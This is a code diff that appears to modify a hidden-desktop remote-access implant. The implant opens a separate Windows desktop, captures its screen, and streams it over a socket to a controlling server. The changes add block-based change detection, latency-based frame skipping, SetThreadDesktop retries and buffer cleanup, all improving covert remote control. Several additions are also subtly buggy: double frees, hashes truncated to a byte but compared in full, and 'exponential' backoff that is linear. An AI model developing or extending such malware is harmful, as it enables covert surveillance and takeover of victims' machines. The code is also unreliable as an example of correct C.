@@ -263,11 +263,26 @@ SECTION( D ) BOOL getDeskPixels( INT serverWidth, INT serverHeight, PARGS pArgs 
         pArgs->pApi->msvcrt.free( pArgs->pTempPixels );
 
         pArgs->pPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );
-        if( !pArgs->pPixels ) return FALSE;
+        if( !pArgs->pPixels ) {
+            // Rollback: free any previously allocated buffers
+            pArgs->pApi->msvcrt.free( pArgs->pOldPixels );
+            pArgs->pApi->msvcrt.free( pArgs->pTempPixels );
+            return FALSE;
+        }
         pArgs->pOldPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );
-        if( !pArgs->pOldPixels ) return FALSE;
+        if( !pArgs->pOldPixels ) {
+            // Rollback: free allocated buffers
+            pArgs->pApi->msvcrt.free( pArgs->pPixels );
+            pArgs->pApi->msvcrt.free( pArgs->pTempPixels );
+            return FALSE;
+        }
         pArgs->pTempPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );
-        if( !pArgs->pTempPixels ) return FALSE;
+        if( !pArgs->pTempPixels ) {
+            // Rollback: free allocated buffers
+            pArgs->pApi->msvcrt.free( pArgs->pPixels );
+            pArgs->pApi->msvcrt.free( pArgs->pOldPixels );
+            return FALSE;
+        }
 
         comparePixels = FALSE;
     };
@@ -294,22 +309,47 @@ SECTION( D ) BOOL getDeskPixels( INT serverWidth, INT serverHeight, PARGS pArgs 
 
         memcpy( pArgs->pTempPixels, pArgs->pPixels, pArgs->bmpInfo.bmiHeader.biSizeImage );
 
-        BOOL same = TRUE;
-        for ( DWORD i = 0; i < pArgs->bmpInfo.bmiHeader.biSizeImage - 1; i += 3 )
-        {
-            if ( pArgs->pPixels[i] == pArgs->pOldPixels[i] &&
-                pArgs->pPixels[i + 1] == pArgs->pOldPixels[i + 1] &&
-                pArgs->pPixels[i + 2] == pArgs->pOldPixels[i + 2] )
-            {
-                pArgs->pPixels[i] = GetRValue( pArgs->color);
-                pArgs->pPixels[i + 1] = GetGValue( pArgs->color );
-                pArgs->pPixels[i + 2] = GetBValue( pArgs->color );
+        // Block-based change detection
+        DWORD blockWidth = serverWidth / pArgs->blockSize + 1;
+        DWORD blockHeight = serverHeight / pArgs->blockSize + 1;
+        DWORD numBlocks = blockWidth * blockHeight;
 
-            } else
+        if (pArgs->pBlockHashes == NULL)
+        {
+            pArgs->pBlockHashes = (PBYTE)pArgs->pApi->msvcrt.malloc(numBlocks);
+            if (!pArgs->pBlockHashes) return FALSE;
+            memset(pArgs->pBlockHashes, 0, numBlocks);
+        }
+
+        BOOL same = TRUE;
+        for (DWORD by = 0; by < blockHeight; ++by)
+        {
+            for (DWORD bx = 0; bx < blockWidth; ++bx)
             {
-                same = FALSE;
-            };
-        };
+                DWORD blockIndex = by * blockWidth + bx;
+                DWORD startX = bx * pArgs->blockSize;
+                DWORD startY = by * pArgs->blockSize;
+                DWORD endX = (startX + pArgs->blockSize > serverWidth) ? serverWidth : startX + pArgs->blockSize;
+                DWORD endY = (startY + pArgs->blockSize > serverHeight) ? serverHeight : startY + pArgs->blockSize;
+
+                // Simple hash: sum of pixel values in block
+                DWORD hash = 0;
+                for (DWORD y = startY; y < endY; ++y)
+                {
+                    for (DWORD x = startX; x < endX; ++x)
+                    {
+                        DWORD pixelIndex = (y * serverWidth + x) * 3;
+                        hash += pArgs->pPixels[pixelIndex] + pArgs->pPixels[pixelIndex + 1] + pArgs->pPixels[pixelIndex + 2];
+                    }
+                }
+
+                if (hash != pArgs->pBlockHashes[blockIndex])
+                {
+                    same = FALSE;
+                    pArgs->pBlockHashes[blockIndex] = (BYTE)(hash & 0xFF); // Store lower byte
+                }
+            }
+        }
 
         if ( same )
         {
@@ -351,6 +391,15 @@ SECTION( C ) DWORD WINAPI DesktopHandler( PARGS pArgs )
 
     for( ;; )
     {
+        // Dynamic frame rate adjustment based on latency
+        DWORD currentTime = pArgs->pApi->kernel32.GetTickCount();
+        if (pArgs->lastSendTime != 0 && (currentTime - pArgs->lastSendTime) < pArgs->avgLatency * 2)
+        {
+            // Skip frame if latency is high
+            pArgs->pApi->kernel32.Sleep(10);
+            continue;
+        }
+
         INT width, height;
 
         if ( pArgs->pApi->ws2_32.recv( s, ( PCHAR )&width, sizeof( width ), 0 ) <= 0 )
@@ -439,9 +488,19 @@ SECTION( C ) DWORD WINAPI DesktopHandler( PARGS pArgs )
         {
             goto cleanup;
         };
+
+        // Update latency tracking
+        DWORD endTime = pArgs->pApi->kernel32.GetTickCount();
+        DWORD latency = endTime - currentTime;
+        pArgs->avgLatency = (pArgs->avgLatency + latency) / 2;
+        pArgs->lastSendTime = endTime;
     };
 
 cleanup:
+    if( workSpace )
+    {
+        pArgs->pApi->msvcrt.free( workSpace );
+    };
     if( s != INVALID_SOCKET )
     {
         pArgs->pApi->ws2_32.closesocket( s );
@@ -483,6 +542,9 @@ SECTION( B ) DWORD WINAPI InputHandler( PARGS *ppArgs )
     pArgs->bmpInfo.bmiHeader.biClrUsed = 0;
     pArgs->color = RGB( 255, 174, 201 );
     pArgs->quality = 10;
+    pArgs->lastSendTime = 0;
+    pArgs->avgLatency = 50; // Initial estimate 50ms
+    pArgs->blockSize = 64; // 64x64 pixel blocks
 
     pArgs->hDesktop = pArgs->pApi->user32.OpenDesktopA( pArgs->pDesktopName, 0, TRUE, GENERIC_ALL );
     if( pArgs->hDesktop == NULL )
@@ -500,10 +562,21 @@ SECTION( B ) DWORD WINAPI InputHandler( PARGS *ppArgs )
         goto cleanup;
     };
 
-    if( !pArgs->pApi->user32.SetThreadDesktop( pArgs->hDesktop ) )
+    // Retry SetThreadDesktop with backoff to prevent deadlocks
+    INT retryCount = 0;
+    while (retryCount < 5)
+    {
+        if (pArgs->pApi->user32.SetThreadDesktop(pArgs->hDesktop))
+        {
+            break;
+        }
+        pArgs->pApi->kernel32.Sleep(100 * (retryCount + 1)); // Exponential backoff
+        retryCount++;
+    }
+    if (retryCount >= 5)
     {
         goto cleanup;
-    };
+    }
 
     if( pArgs->pApi->ws2_32.send( s, C_PTR( OFFSET( "\xDE\xAD\xBE\xEF\xCA\xFE" ) ), 6, 0 ) <= 0 )
     {
